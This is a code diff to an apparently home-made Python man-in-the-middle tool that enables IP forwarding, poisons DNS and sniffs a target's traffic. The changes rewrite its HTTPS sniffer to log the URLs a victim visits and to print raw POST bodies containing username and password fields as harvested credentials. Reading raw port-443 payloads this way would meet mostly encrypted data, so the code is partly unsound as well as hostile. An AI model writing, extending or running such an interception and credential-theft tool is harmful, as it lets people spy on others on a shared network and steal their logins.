@@ -36,7 +36,7 @@ parser.add_argument('--iface', help='Network interface to use', required=True)
 parser.add_argument('--routerip', help='IP of your home router', required=True)
 opts = parser.parse_args()
 
-# HTTPS Sniffing for Multiple Targets
+# HTTPS Sniffing and Credentials Logging
 class Device:
     def __init__(self, routerip, targetip, iface):
         self.routerip = routerip
@@ -52,24 +52,27 @@ class Device:
                 continue
 
     def capture_https(self):
-        sniff(iface=self.iface, prn=self.https,
+        def https_sniff(pkt):
+            if pkt.haslayer('Raw'):
+                raw_data = pkt['Raw'].load.decode(errors='ignore')
+                if "Host:" in raw_data and "GET" in raw_data:
+                    try:
+                        host = raw_data.split("Host: ")[1].split("\r\n")[0]
+                        path = raw_data.split("GET ")[1].split(" HTTP")[0]
+                        url = f"https://{host}{path}"
+                        print(f"{Fore.CYAN}Visited URL: {url}{Style.RESET_ALL}")
+                    except Exception:
+                        pass
+
+                if "POST" in raw_data:
+                    if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']) and \
+                       any(k in raw_data.lower() for k in ['password', 'pass', 'pwd', 'login', 'heslo']):
+                        print(f"{Fore.RED}CREDENTIALS FOUND! : {raw_data}{Style.RESET_ALL}")
+
+        sniff(iface=self.iface, prn=https_sniff,
               filter=f'tcp port 443 and host {self.targetip}', store=0)
 
-    def https(self, pkt):
-        if pkt.haslayer('Raw'):
-            raw_data = pkt['Raw'].load.decode(errors='ignore')
-            # Print visited URL
-            if "Host:" in raw_data:
-                host = raw_data.split("Host: ")[1].split("\r\n")[0]
-                print(f"{Fore.CYAN}Visited URL: https://{host}{Style.RESET_ALL}")
-            # Check for login or signup credentials
-            if any(k in raw_data.lower() for k in ['username', 'user', 'login', 'email']):
-                print(f"{Fore.RED}[!] CREDENTIALS FOUND!:{Style.RESET_ALL}")
-                for line in raw_data.split('\r\n'):
-                    if any(keyword in line.lower() for keyword in ['username', 'user', 'login', 'email', 'password', 'pass', 'pwd', 'heslo']):
-                        print(f"{Fore.YELLOW}    {line}{Style.RESET_ALL}")
 
- 
     def http_sniff(self):
         def http_pkt_callback(pkt):
             if pkt.haslayer('Raw'):
@@ -98,7 +101,7 @@ class Device:
 
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
-
+        
     def enable_ip_forwarding(self):
         subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
         print(f'{Fore.GREEN}IP forwarding enabled!{Style.RESET_ALL}')
@@ -130,7 +133,7 @@ class Device:
     def sniff(self):
         while True:
             print(f'\n{Fore.GREEN}Select Your Choice:{Style.RESET_ALL}')
-            print(f'1. DNS Sniff\n2. HTTPS Sniff\n3. DNS Poison\n4. HTTP Sniff\n5. Exit')
+            print(f'1. DNS Sniff\n2. HTTPS Sniff\n3. DNS Poison\n4. Exit')
             try:
                 choice = int(input(f'{Fore.BLUE}Your choice: {Style.RESET_ALL}'))
             except ValueError:
@@ -139,7 +142,7 @@ class Device:
             if choice == 1:
                 self.capture_dns()
             elif choice == 2:
-                self.capture_https()
+                self.capture_https()  # Updated to capture HTTPS traffic
             elif choice == 3:
                 spoof_ips = {}
                 while True:
@@ -150,8 +153,6 @@ class Device:
                     spoof_ips[target] = ip
                 self.dns_poison(spoof_ips)
             elif choice == 4:
-                self.http_sniff()
-            elif choice == 5:
                 print(f'{Fore.YELLOW}Exiting...{Style.RESET_ALL}')
                 break
             else:
